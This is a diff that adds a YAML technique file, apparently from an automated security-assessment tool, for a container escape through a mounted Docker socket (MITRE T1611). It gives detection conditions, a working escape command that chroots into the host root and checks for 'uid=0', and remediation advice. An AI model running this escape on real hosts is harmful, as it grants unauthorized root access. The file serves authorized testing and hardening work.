@@ -1,0 +1,51 @@
+# Container escape via mounted /var/run/docker.sock
+#
+# One of the most common container-security mistakes: mounting the host's
+# Docker socket into a container (usually so the container can build/run
+# other containers). A writable docker.sock IS root on the host — the
+# operator asks docker to start a new container that mounts the host root
+# and chroots into it, executing whatever they want as the host's root.
+#
+# Only fires when BOTH in_container=True AND has_docker_sock=True. A
+# bare-metal host that happens to have docker installed shouldn't produce
+# this vector — it's not an "escape" if there's nothing to escape from.
+technique: T1611
+name: Container escape → docker.sock → host root
+tactic: [privilege-escalation, defense-evasion]
+platform: [linux]
+# Distinct dedup key so all three T1611 TTPs coexist as separate opportunities.
+key: container_escape:docker_sock
+ranking:
+  exploitability: high        # writable docker.sock = one-shot host root
+  safety: config-change        # spawns a new container on the host
+  detection: moderate          # docker events log; EDR may notice a new container
+detect:
+  facts_match:
+    in_container: true
+    has_docker_sock: true
+execute:
+  # Ask the host docker daemon (via the mounted socket) to start an alpine
+  # container that binds the host root at /mnt, then chroot in and run id.
+  # `--rm` cleans up the container on exit; still a config-change because
+  # docker events + audit logs are created either way.
+  command: |-
+    docker run -v /:/mnt --rm --entrypoint /usr/sbin/chroot alpine /mnt id
+verify:
+  success: "uid=0"
+cleanup:
+  command: ""                 # --rm handled it; docker events remain in log
+report:
+  vector_type: container_escape_docker_sock
+  description: >
+    A container with /var/run/docker.sock mounted writable can command
+    the host Docker daemon. Since the daemon runs as root on the host, any
+    container it starts inherits host-root capabilities — the standard
+    escape is to launch a fresh container that mounts the host root and
+    chroots into it. The escape target is the container's host, not the
+    container itself.
+  remediation: >
+    Never mount the docker socket into a container without an explicit
+    security review — it is equivalent to giving the container root on
+    the host. Where DinD (Docker-in-Docker) is truly needed, use rootless
+    dockerd or a mediating proxy that restricts the API surface.
+  refs: [T1611, docker-security]
